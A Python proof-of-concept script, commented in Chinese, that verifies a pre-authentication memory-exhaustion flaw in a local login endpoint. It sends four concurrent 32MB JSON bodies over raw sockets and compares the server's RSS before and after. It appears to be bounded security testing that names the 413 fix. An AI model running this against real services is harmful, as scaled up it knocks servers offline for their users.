#!/usr/bin/env python3
"""PoC-6: 未认证请求体内存耗尽（pre-auth memory DoS）验证。

漏洞假设：
  /api/auth/login 是公开端点，且全链路（uvicorn h11 缓冲 + FastAPI JSON
  解析）对请求体大小没有任何限制。未认证攻击者并发发送超大 JSON 时，
  服务端内存被成倍消耗（每连接 ≈ 请求体大小），可低成本打爆面板。

验证方式：
  1. 记录服务进程（PID 2750）当前 RSS；
  2. 用 4 个并发连接各发送一个 32MB 的 JSON 登录请求（未认证）；
  3. 等待解析完成后再次采样 RSS；
  4. 若 RSS 增长 ≈ 并发数 × 请求大小 → 漏洞成立。

安全边界：32MB × 4 = 128MB，沙箱可承受；仅证明可放大，不做真实打挂。
"""
import json
import os
import socket
import sys
import time
import threading
import urllib.request
import urllib.error

BASE = "http://127.0.0.1:8000/api/auth/login"
SERVER_PID = int(os.environ.get("GRAW_PID", "2750"))
CONCURRENCY = 4
BODY_MB = 32


def rss_mb(pid):
    with open(f"/proc/{pid}/status") as f:
        for line in f:
            if line.startswith("VmRSS:"):
                return int(line.split()[1]) / 1024
    return -1


def send_big_body(result, idx):
    """原始 socket：发送头 + 分块发送大 body，边发边读服务端响应。

    这样即使服务端中途关闭连接（413 截断攻击者的发送），我们也能读到
    响应状态行；urllib 在 RST 时只会抛异常丢失状态码。
    """
    pad = "A" * (BODY_MB * 1024 * 1024 - 64)
    body = json.dumps({"username": "x", "password": "y", "pad": pad}).encode()
    req = (
        f"POST /api/auth/login HTTP/1.1\r\n"
        f"Host: 127.0.0.1:8000\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    try:
        s = socket.create_connection(("127.0.0.1", 8000), timeout=30)
        s.sendall(req)
        sent = 0
        chunk = 1024 * 512
        while sent < len(body):
            try:
                s.sendall(body[sent:sent + chunk])
            except (BrokenPipeError, ConnectionResetError):
                break  # 服务端已截断
            sent += chunk
        # 读取响应（若连接已被截断则读到 EOF）
        data = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                data += d
        except (ConnectionResetError, socket.timeout, OSError):
            pass
        s.close()
        status = data.split(b"\r\n", 1)[0].decode("utf-8", "replace") if data else "(无响应)"
        result[idx] = status
    except Exception as e:
        result[idx] = f"ERR {type(e).__name__}: {str(e)[:60]}"


def main():
    before = rss_mb(SERVER_PID)
    print(f"[*] 服务进程 PID={SERVER_PID} 基线 RSS: {before:.1f} MB")

    results = [None] * CONCURRENCY
    threads = [threading.Thread(target=send_big_body, args=(results, i)) for i in range(CONCURRENCY)]
    peak_during = before
    for t in threads:
        t.start()
    # 采样传输/解析期间的峰值
    while any(t.is_alive() for t in threads):
        peak_during = max(peak_during, rss_mb(SERVER_PID))
        time.sleep(0.2)
    for t in threads:
        t.join()
    time.sleep(1.0)  # 等 GC/释放
    after = rss_mb(SERVER_PID)

    sent = CONCURRENCY * BODY_MB
    print(f"[*] 并发发送：{CONCURRENCY} 连接 × {BODY_MB}MB JSON（未认证）")
    print(f"[*] HTTP 响应: {results}")
    print(f"[*] 峰值 RSS: {peak_during:.1f} MB（Δ +{peak_during - before:.1f} MB）")
    print(f"[*] 结束 RSS: {after:.1f} MB")

    growth = peak_during - before
    verdict = growth > sent * 0.4  # 增长超过发送量 40% 即视为内存被放大消耗
    print(f"\n[结论] 发送 {sent}MB，服务端内存增长 {growth:.1f}MB -> "
          + ("[!!] 漏洞成立：未认证请求体可线性放大服务端内存消耗" if verdict else "已有防护（增长未随请求体放大）")
          + f" | 修复后预期：连接被 413 提前拒绝，内存增长接近 0")
    return 1 if verdict else 0


if __name__ == "__main__":
    sys.exit(main())
